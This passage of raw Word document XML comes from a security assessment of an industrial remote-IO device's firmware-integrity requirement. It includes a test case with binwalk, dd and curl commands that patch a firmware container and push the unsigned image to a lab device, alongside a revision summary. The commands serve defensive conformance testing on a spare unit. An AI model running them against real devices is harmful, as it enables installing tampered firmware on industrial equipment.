              <w:lastRenderedPageBreak/>
              <w:t>Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F6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0651E" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>TC-RQ005-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="4942B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F02DF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DDEA2" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve">Spare SRIO DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> eth1 = 192.168.50.10; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>browser</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> 192.168.50.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="053B4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8C68E" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61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60ADB" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">curl to IoT-Core firmware profile; hex editor / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>binwalk</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (OWASP FSTM) to inspect &amp; modify container; Wireshark</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D65E720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># TC-RQ005-03 Attempt install of a modified/unsigned firmware container (spare DUT only)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5960945C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># 0) Device in Update state (operational precondition; authorization of the gate = RQ-011)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6928702D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># 1) Inspect the legitimate container for any signature/header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F64579F" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>binwalk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -E </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fw_container.bin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>binwalk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fw_container.bin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | tee TC0503_hdr.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57825078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># 2) Modify one byte (or blank a putative signature region)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D55E00A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 xml:space="preserve">cp </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fw_container.bin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fw_mod.bin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> '\x00' | dd of=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fw_mod.bin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> bs=1 seek=4096 conv=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>notrunc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2280AE4F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># 3) Upload via IoT-Core BLOB service (chunked) and trigger install</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DABDBE6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 xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId126" w:history="1">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/firmware/container/start_stream_set</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="051FE02C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 xml:space="preserve"># ...chunked </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>stream_set</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fw_mod.bin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> per container/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>chunksize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E7B4C1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 xml:space="preserve">curl -s -X POST </w:t>
      </w:r>
      <w:hyperlink r:id="rId127" w:history="1">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/firmware/install</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> # observe accept vs. signature-reject</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0E0F80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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Container is an </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unsigned BLOB</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-2953); no signature-verification step → modified image accepted for install (device reboots to apply). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Modified image accepted (G-2 confirmed → FAIL vs RQ-005) ☐ Rejected (investigate) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC0503_hdr.txt, upload/install PCAP, LED sequence photo, post-install version read; </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>re-flash log</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> with validated image | </w:t>
      </w:r>
      <w:hyperlink r:id="rId128" w:history="1">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7C7594F6" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Justification:</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> maps to OWASP ISTG </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ISTG-FW[UPDT]-CRYPT-001</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (insufficient update signature) and**-CRYPT-004** (insufficient signature verification); OWASP FSTM Stage 7 firmware-integrity. </w:t>
      </w:r>
      <w:hyperlink r:id="rId129" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[OWASP IoT...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ting</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> Guide | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId130" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="45E09E1F" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:pict w14:anchorId="754B1B64">
          <v:rect id="_x0000_i1290" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="551EF5BC" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of Changes (vs. my original RQ-005)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC60B69" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Removed the authorization/access-control scope creep</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — dropped the </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Elevation-of-Privilege threat</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, the**"physical update gate (switch 999 + Update state)"** as an RQ-005 mitigation, </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Asset </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> primary, and </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ005-05 (Firmware-Update Access-Control Gate)</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. These are </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>access control = RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and have been returned there.</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Mirror of the RQ-004 correction: RQ-004 hands identification-integrity to RQ-005; RQ-005 hands update-authorization to RQ-011.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB07405" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Kept the integrity core intact</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — CR 3.4 (Part B), EDR 3.14 (boot), </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EDR 3.10 signature-verification</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Part D, decisive), EDR 3.12/3.13 (trust anchors), CR 3.3 (runtime self-test). </w:t>
      </w:r>
      <w:hyperlink r:id="rId131" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0B5F9220" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Reframed Spoofing</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authenticity of the firmware image</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (integrity — the device cannot verify the image's source/integrity), which is legitimately RQ-005, rather than an access-control bypass.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7592D7" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Retained the substantive gaps</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — G-1 (Part B CRC≠MAC, incl. 16-bit </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (Part D unsigned BLOB / no secure boot / no trust anchor — decisive)</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, G-3 (runtime cross-check blind to identical modification). </w:t>
      </w:r>
      <w:hyperlink r:id="rId132" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId133" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="758F2B4D" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Standard-citation caution retained</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>prEN</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 50742 §7.4.3.4.1 (SRSL3) presented as </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>your</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> benchmark, not verified fact.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107D2A14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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Corrected verdict, cleanly bounded: </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005 = protect the firmware image and config against corruption (accidental met via CRC/redundancy; intentional not met — no cryptographic authenticity)</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — with </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>who may update</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> deferred to </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
